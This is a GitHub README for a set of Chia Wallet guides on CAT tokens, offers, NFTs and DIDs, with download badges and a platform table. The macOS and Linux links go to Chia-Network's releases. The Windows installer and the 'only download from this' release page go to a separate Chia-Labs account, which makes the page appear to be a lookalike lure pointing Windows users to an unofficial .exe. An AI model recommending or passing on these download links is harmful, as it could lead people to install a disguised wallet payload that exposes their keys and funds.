<div align="center">

![Chia Wallet](assets/banner-hub.png)

</div>

<h1 align="center">Chia Wallet tokens</h1>

<p align="center">CATs, offers, NFTs and DIDs, with the asset ID as the identifier that matters.</p>

<div align="center">

![LICENSE](https://img.shields.io/badge/LICENSE-Apache--2.0-3EAC5C?style=for-the-badge&labelColor=2B3347) ![RELEASE](https://img.shields.io/badge/RELEASE-v2.7.5-3EAC5C?style=for-the-badge&labelColor=2B3347)

</div>

---

## Downloads - v2.7.5

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

This set covers everything in a Chia Wallet that is not plain XCH: CAT tokens added
by asset ID, a token send that still pays a fee, offers built and cancelled, NFTs received into an
NFT wallet, and the DID that ties an identity to the assets it owns. Each page names the identifier
that matters at that step - the asset ID for a CAT, the offer file for a trade, the DID for a
collection - so a reader can tell one asset from another without guessing.

The unit underneath all of it is the mojo, the smallest divisible amount of XCH, and the fee model
follows from it. That is why the fee page sits in this set rather than in a general guide: a token
transfer, an offer and a CAT send all cost a fee in XCH, and a wallet with no XCH cannot move a
token even when the token balance is large.

Offers are the part that needs patience. An offer is a signed proposal with an expiry, and nothing
happens until someone takes it, which is why an offer can look pending while nothing is wrong. The
create page sets the expiry and the fee deliberately; the cancel page explains what cancelling does
to a proposal that was already published.

As everywhere in this wallet, the key stays on the device and the 24-word phrase stays offline. A
CAT balance, an NFT and a DID are all owned by the same key, so the phrase is the only backup that
restores them together.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Create a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) | Build the trade, set the expiry and publish it without exposing keys. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Cancel a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/how-to-cancel-a-chia-offer.md) | What cancelling does to the offer, and the fee that was already paid. |
| [What is a Chia DID](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/what-is-a-chia-did.md) | A decentralised identity attached to a wallet and the NFTs it owns. |

</div>

## Every guide in this repository

### Tokens and offers

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |
| [Create a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) | Build the trade, set the expiry and publish it without exposing keys. |
| [Cancel a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/how-to-cancel-a-chia-offer.md) | What cancelling does to the offer, and the fee that was already paid. |
| [Receive NFTs](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/receiving-nfts-in-chia-wallet.md) | The NFT wallet, the DID behind it and how a transfer arrives. |
| [What is a Chia DID](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/what-is-a-chia-did.md) | A decentralised identity attached to a wallet and the NFTs it owns. |

</div>

## More guides

<div align="center">

| Repository | What it carries |
| --- | --- |
| [wallet-guides](https://github.com/Chia-Labs/wallet-guides/blob/main/README.md) | Every guide in the account, in one list |
| [wallet-fixes](https://github.com/Chia-Labs/wallet-fixes/blob/main/README.md) | When the wallet stops working, fix it in this order. |

</div>

## About

Guides are published as files in this repository, one per question, and each one is written to answer
it in the first sentence. The wallet they describe is [Chia Wallet](https://github.com/Chia-Labs/Chia-desktop-wallet), and its installers
and checksums are on the [v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

## License

Apache-2.0
